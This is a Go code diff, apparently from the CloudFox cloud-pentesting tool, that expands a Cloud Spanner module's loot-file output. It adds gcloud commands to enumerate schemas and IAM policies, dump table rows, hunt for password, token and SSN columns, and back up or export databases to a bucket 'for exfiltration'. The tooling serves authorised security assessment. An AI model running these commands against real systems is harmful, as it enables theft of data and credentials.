@@ -137,9 +137,9 @@ func (m *SpannerModule) addInstanceToLoot(projectID string, instance spannerserv
 		return
 	}
 	lootFile.Contents += fmt.Sprintf(
-		"# ==========================================\n"+
+		"# =============================================================================\n"+
 			"# INSTANCE: %s\n"+
-			"# ==========================================\n"+
+			"# =============================================================================\n"+
 			"# Project: %s\n"+
 			"# Display Name: %s\n"+
 			"# Config: %s\n"+
@@ -176,9 +176,9 @@ func (m *SpannerModule) addDatabaseToLoot(projectID string, database spannerserv
 		return
 	}
 	lootFile.Contents += fmt.Sprintf(
-		"# ------------------------------------------\n"+
+		"# -----------------------------------------------------------------------------\n"+
 			"# DATABASE: %s (Instance: %s)\n"+
-			"# ------------------------------------------\n"+
+			"# -----------------------------------------------------------------------------\n"+
 			"# Project: %s\n"+
 			"# State: %s\n"+
 			"# Encryption: %s\n",
@@ -198,15 +198,53 @@ func (m *SpannerModule) addDatabaseToLoot(projectID string, database spannerserv
 		}
 	}
 
+	lootFile.Contents += fmt.Sprintf(`
+# === ENUMERATION COMMANDS ===
+
+# Describe database:
+gcloud spanner databases describe %s --instance=%s --project=%s
+
+# Get database IAM policy:
+gcloud spanner databases get-iam-policy %s --instance=%s --project=%s
+
+# List all tables:
+gcloud spanner databases execute-sql %s --instance=%s --project=%s --sql="SELECT * FROM INFORMATION_SCHEMA.TABLES"
+
+# List all columns for all tables:
+gcloud spanner databases execute-sql %s --instance=%s --project=%s --sql="SELECT TABLE_NAME, COLUMN_NAME, SPANNER_TYPE FROM INFORMATION_SCHEMA.COLUMNS ORDER BY TABLE_NAME"
+
+# List indexes:
+gcloud spanner databases execute-sql %s --instance=%s --project=%s --sql="SELECT * FROM INFORMATION_SCHEMA.INDEXES"
+
+# Get DDL (schema dump):
+gcloud spanner databases ddl describe %s --instance=%s --project=%s
+
+`,
+		database.Name, database.InstanceName, database.ProjectID,
+		database.Name, database.InstanceName, database.ProjectID,
+		database.Name, database.InstanceName, database.ProjectID,
+		database.Name, database.InstanceName, database.ProjectID,
+		database.Name, database.InstanceName, database.ProjectID,
+		database.Name, database.InstanceName, database.ProjectID,
+	)
+
+	// === EXPLOIT COMMANDS ===
 	lootFile.Contents += fmt.Sprintf(
-		"\n# Describe database:\n"+
-			"gcloud spanner databases describe %s --instance=%s --project=%s\n\n"+
-			"# Get database IAM policy:\n"+
-			"gcloud spanner databases get-iam-policy %s --instance=%s --project=%s\n\n"+
-			"# Execute SQL query:\n"+
-			"gcloud spanner databases execute-sql %s --instance=%s --project=%s --sql=\"SELECT * FROM INFORMATION_SCHEMA.TABLES\"\n\n",
+		"# === EXPLOIT COMMANDS ===\n\n"+
+			"# Dump data from tables (replace TABLE_NAME):\n"+
+			"gcloud spanner databases execute-sql %s --instance=%s --project=%s --sql=\"SELECT * FROM TABLE_NAME LIMIT 100\"\n\n"+
+			"# Dump all rows from a table:\n"+
+			"gcloud spanner databases execute-sql %s --instance=%s --project=%s --sql=\"SELECT * FROM TABLE_NAME\" --format=json > /tmp/spanner-dump.json\n\n"+
+			"# Search for sensitive data patterns:\n"+
+			"gcloud spanner databases execute-sql %s --instance=%s --project=%s --sql=\"SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE LOWER(COLUMN_NAME) LIKE '%%password%%' OR LOWER(COLUMN_NAME) LIKE '%%secret%%' OR LOWER(COLUMN_NAME) LIKE '%%token%%' OR LOWER(COLUMN_NAME) LIKE '%%key%%' OR LOWER(COLUMN_NAME) LIKE '%%credit%%' OR LOWER(COLUMN_NAME) LIKE '%%ssn%%'\"\n\n"+
+			"# Create a backup (for exfiltration):\n"+
+			"gcloud spanner backups create cloudfox-backup --instance=%s --database=%s --project=%s --expiration-date=$(date -u -d '+7 days' '+%%Y-%%m-%%dT%%H:%%M:%%SZ') --async\n\n"+
+			"# Export database to GCS:\n"+
+			"gcloud spanner databases export %s --instance=%s --project=%s --output-uri=gs://BUCKET_NAME/spanner-export/\n\n",
 		database.Name, database.InstanceName, database.ProjectID,
 		database.Name, database.InstanceName, database.ProjectID,
+		database.Name, database.InstanceName, database.ProjectID,
+		database.InstanceName, database.Name, database.ProjectID,
 		database.Name, database.InstanceName, database.ProjectID,
 	)
 }
